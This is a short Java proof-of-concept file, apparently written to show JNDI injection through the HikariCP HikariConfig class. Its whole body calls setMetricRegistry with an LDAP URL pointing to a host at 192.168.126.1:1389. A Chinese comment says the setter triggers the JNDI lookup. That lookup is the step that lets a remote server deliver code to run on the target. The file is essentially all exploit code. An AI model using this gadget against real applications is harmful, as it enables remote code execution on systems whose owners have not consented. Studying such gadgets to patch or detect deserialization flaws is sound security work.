package com.example;

import com.zaxxer.hikari.HikariConfig;

public class setterPoc {
    public static void main(String[] args) throws Exception {
        HikariConfig config = new HikariConfig();
        //set触发jndi
        config.setMetricRegistry("ldap://192.168.126.1:1389/zh1yph");
    }
}
